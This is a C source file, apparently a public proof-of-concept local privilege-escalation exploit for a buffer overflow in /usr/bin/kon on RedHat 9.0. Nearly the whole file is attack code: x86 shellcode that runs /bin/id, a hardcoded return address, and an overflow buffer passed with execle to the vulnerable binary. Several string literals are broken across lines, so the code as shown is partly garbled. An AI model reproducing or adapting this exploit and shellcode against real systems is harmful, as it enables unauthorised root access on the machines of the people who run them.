/*
 * Buffer overflow in /usr/bin/kon v0.3.9b for RedHat 9.0
 *
 * http://www.mail-archive.com/bugtraq@securityfocus.com/msg11681.html
 *
 * The original bug was found by wszx for RedHat 8.0 - Ported to C
 *
 * Compile: gcc -Wall kon2root kon2root.c
 *
 */


#include <stdio.h>
#include <string.h>
#include <unistd.h>


#define NOP      0x90
#define RET      0xbffffffa
#define VULN     "/usr/bin/kon"
#define MAXBUF   800


static char w00tI4r3l33t[]="\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07
\x89"
                           "\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56
\x0c"
                           "\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8
\xdc\xff"
                           "\xff\xff/bin/id";


int main()
{
        int i, *egg;
        long retaddr;
        static char buff[MAXBUF];
        static char *sploit[0x02] = { w00tI4r3l33t, NULL };


        fprintf (stdout, "\n\n\n[ PoC code for local root exploit in %s ]
\n", VULN);
        fprintf (stdout, "[ Coded by c0ntex  -  http://62.31.72.168 ]\n");
        fprintf (stdout, "[ For Linux RedHat v9 x86  -  Ret_Addr
0xbffffffa ]\n\n\n\n");

        if((retaddr = 0xbffffffa - strlen(w00tI4r3l33t) - strlen(VULN)) !
= 0x00) {
                egg = (int *)(buff);
        }

        for(i = 0x00; i < MAXBUF; i += 0x04)
        *(egg)++ = retaddr; *(egg) = NOP;

        execle(VULN, VULN, "-Coding", buff, NULL, sploit);

        return(0x00);
}
